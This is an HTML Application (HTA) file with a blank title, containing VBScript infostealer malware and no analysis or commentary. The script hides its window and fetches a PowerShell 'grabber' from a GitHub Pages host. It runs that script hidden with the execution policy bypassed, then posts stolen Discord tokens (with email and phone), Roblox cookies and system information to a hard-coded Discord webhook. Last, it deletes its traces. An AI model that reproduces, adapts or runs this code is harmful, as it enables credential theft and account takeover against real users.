<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next
WScript.Sleep 5000
window.resizeTo 0,0
window.moveTo -2000,-2000

Dim WH, Shell, FSO, x
WH = "https://discord.com/api/webhooks/1561919366331760740/hJ5A0jv7LN6paga1D2OvdU5L2S6zCAc--_Y8gKc_bVTaZOLKlXInPRsAfsFggCBhpEPA"

Set Shell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

Function TmpFile(n)
    TmpFile = Shell.ExpandEnvironmentStrings("%TEMP%") & "\" & n
End Function

Function ReadFile(p)
    Dim f
    If Not FSO.FileExists(p) Then ReadFile = "" : Exit Function
    Set f = FSO.OpenTextFile(p, 1)
    ReadFile = f.ReadAll
    f.Close
    Set f = Nothing
End Function

Sub WriteFile(p, c)
    Dim f
    Set f = FSO.CreateTextFile(p, True)
    f.Write c
    f.Close
    Set f = Nothing
End Sub

Sub SendToDiscord(msg)
    Dim x, boundary, body
    boundary = "----WebKitFormBoundary" & Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 8)
    body = "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""content""" & vbCrLf
    body = body & vbCrLf
    body = body & msg & vbCrLf
    body = body & "--" & boundary & "--"
    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    x.Open "POST", WH, False
    x.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    x.Send body
    Set x = Nothing
End Sub

Sub Run()
    On Error Resume Next
    Dim psf, rf, raw, lines, l, cnt, p, info
    
    ' Download the PowerShell script
    psf = TmpFile("g.ps1")
    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    x.Open "GET", "https://alexproisgamer-dotcom.github.io/", False
    x.Send
    If x.Status = 200 Then
        WriteFile psf, x.responseText
    End If
    Set x = Nothing
    
    If Not FSO.FileExists(psf) Then
        SendToDiscord "Error: Failed to download grabber.ps1"
        Exit Sub
    End If
    
    Shell.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
    
    rf = TmpFile("steal_result.txt")
    If FSO.FileExists(rf) Then
        raw = ReadFile(rf)
        FSO.DeleteFile rf, True
        FSO.DeleteFile psf, True
        
        If Len(raw) > 10 Then
            lines = Split(raw, vbCrLf)
            cnt = 0
            For Each l In lines
                If Len(l) > 10 Then
                    If Left(l, 8) = "DISCORD|" Then
                        p = Split(Mid(l, 9), "|")
                        If UBound(p) >= 4 Then
                            info = "User: " & p(0) & vbCrLf & "Email: " & p(1) & vbCrLf & "Phone: " & p(2) & vbCrLf & "ID: " & p(3) & vbCrLf & "Token: " & p(4)
                            SendToDiscord "Discord Token:" & vbCrLf & info
                            cnt = cnt + 1
                        End If
                    End If
                    If Left(l, 7) = "ROBLOX|" Then
                        SendToDiscord "Roblox Cookie:" & vbCrLf & Mid(l, 8)
                        cnt = cnt + 1
                    End If
                    If Left(l, 7) = "SYSTEM|" Then
                        SendToDiscord "System Info:" & vbCrLf & Mid(l, 8)
                        cnt = cnt + 1
                    End If
                End If
            Next
            SendToDiscord "Sent " & cnt & " items to Discord"
        End If
    End If
End Sub

Call Run
window.close
</script>
</head>
<body></body>
</html>
